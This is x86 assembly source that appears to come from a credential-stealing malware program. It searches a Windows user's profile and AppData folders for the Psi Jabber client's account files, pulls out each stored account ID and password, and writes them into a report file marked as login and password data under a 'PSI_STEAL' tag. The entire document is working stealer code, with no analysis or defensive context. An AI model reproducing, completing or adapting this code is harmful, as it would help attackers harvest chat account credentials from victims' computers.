     
.data?
      psi_dir            db   400h dup (?)
      psi_buf1           db   400h dup (?)
      psi_jid            db   200h dup (?)
      psi_pwd            db   200h dup (?)
      psi_acc_str1       db   10h  dup (?)
      psi_acc_str2       db   10h  dup (?)
      psifd              WIN32_FIND_DATA <>
     
.code

ProcessPsiDir proc lpPath:DWORD
      LOCAL   hFind:DWORD
      LOCAL   p1:DWORD
      LOCAL   pbegin:DWORD
      LOCAL   pend:DWORD
      LOCAL   gbegin:DWORD
      LOCAL   psi_cntr:DWORD
      
      ; Find account dirs
      FindFirstFileW, lpPath, addr psifd
      mov     dword ptr [hFind], eax
      cmp     eax, -1
      je      no_psi
      
      lstrlenW, lpPath
      imul    eax, eax, 2
      add     eax, dword ptr [lpPath]
      mov     dword ptr [eax - 2], 0
      
    psi_search_lp:
      lstrcmpW, addr psifd.cFileName, addr fake1W
      test    eax, eax
      je      psi_skip_search
      lstrcmpW, addr psifd.cFileName, addr fake2W
      test    eax, eax
      je      psi_skip_search
      
      push    offset psifd.cFileName
      push    dword ptr [lpPath]
      push    offset psi_mask_1
      push    offset psi_buf1
      call    wsprintfW
      add     esp, 4*4
      
      ; parse file
      invoke  MapFile, addr psi_buf1, addr mfile, MAP_FILE_W
      test    eax, eax
      je      no_psi
      
      ; Some init
      mov     dword ptr [psi_cntr], 0
      ; Parsing loop
      xor     ebx, ebx
    psi_parse_lp:
      push    dword ptr [psi_cntr]
      push    offset psi_mask_21
      push    offset psi_acc_str1
      call    wsprintf
      add     esp, 4*3
      push    dword ptr [psi_cntr]
      push    offset psi_mask_22
      push    offset psi_acc_str2
      call    wsprintf
      add     esp, 4*3
      
      mov     ecx, dword ptr [mfile.lpMem]
      add     ecx, ebx
      mov     dword ptr [p1], ecx
      ; find <a%i>
      lstrlen, p1
      push    eax
      lstrlen, addr psi_acc_str1
      push    eax
      push    dword ptr [p1]
      push    offset psi_acc_str1
      call    strpos
      test    eax, eax
      je      psi_no_pwds_here
      mov     dword ptr [pbegin], eax
      ; find </a%i>
      lstrlen, pbegin
      push    eax
      lstrlen, addr psi_acc_str2
      push    eax
      push    dword ptr [pbegin]
      push    offset psi_acc_str2
      call    strpos
      test    eax, eax
      je      psi_no_pwds_here
      mov     dword ptr [pend], eax
      
      ; find jid
      lstrlen, pbegin
      push    eax
      push    sizeof psi_jid1
      push    dword ptr [pbegin]
      push    offset psi_jid1
      call    strpos
      test    eax, eax
      je      psi_no_pwds_in_section
      add     eax, sizeof psi_jid1
      mov     dword ptr [gbegin], eax
      ; find jid end
      lstrlen, gbegin
      push    eax
      push    sizeof psi_jid2
      push    dword ptr [gbegin]
      push    offset psi_jid2
      call    strpos
      test    eax, eax
      je      psi_no_pwds_in_section
      sub     eax, dword ptr [gbegin]
      test    eax, eax
      je      psi_no_pwds_in_section
      add     eax, 1
      lstrcpyn, addr psi_jid, gbegin, eax
      
      ; find pwd
      lstrlen, pbegin
      push    eax
      push    sizeof psi_pwd1
      push    dword ptr [pbegin]
      push    offset psi_pwd1
      call    strpos
      test    eax, eax
      je      psi_no_pwds_in_section
      add     eax, sizeof psi_pwd1
      mov     dword ptr [gbegin], eax
      ; find pwd end
      lstrlen, gbegin
      push    eax
      push    sizeof psi_pwd2
      push    dword ptr [gbegin]
      push    offset psi_pwd2
      call    strpos
      test    eax, eax
      je      psi_no_pwds_in_section
      sub     eax, dword ptr [gbegin]
      test    eax, eax
      je      psi_no_pwds_in_section
      add     eax, 1
      lstrcpyn, addr psi_pwd, gbegin, eax
      
      lstrlen, addr psi_jid
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr psi_jid, plen, addr SNW, NULL
      
      lstrlen, addr psi_pwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr psi_pwd, plen, addr SNW, NULL
      
    psi_no_pwds_in_section:
      mov     ebx, dword ptr [pend]
      sub     ebx, dword ptr [mfile.lpMem]
      inc     ebx
      inc     dword ptr [psi_cntr]
      cmp     ebx, dword ptr [mfile.dwFileSize]
      jle     psi_parse_lp
      
    psi_no_pwds_here:
      invoke  UnmapFile, addr mfile
      
    psi_skip_search:
      FindNextFileW, hFind, addr psifd
      test    eax, eax
      jne     psi_search_lp
      FindClose, hFind
    no_psi:
      
      
      ret
ProcessPsiDir endp

GetPsiPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], PSI_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetPsiPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; Get psi folder path #1
      mov     dword ptr [psi_dir], 0
      push    0
      push    CSIDL_PROFILE
      push    offset psi_dir
      push    0
      call    dword ptr [_SHGetSpecialFolderPathW]
      push    offset psi_dir
      call    dword ptr [_PathAddBackslashW]
      lstrcatW, addr psi_dir, addr psi_path1
      invoke  ProcessPsiDir, addr psi_dir
      ; Get psi folder path #2
      mov     dword ptr [psi_dir], 0
      push    0
      push    CSIDL_APPDATA
      push    offset psi_dir
      push    0
      call    dword ptr [_SHGetSpecialFolderPathW]
      push    offset psi_dir
      call    dword ptr [_PathAddBackslashW]
      lstrcatW, addr psi_dir, addr psi_path2
      invoke  ProcessPsiDir, addr psi_dir
      
    GetPsiPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetPsiPwd endp
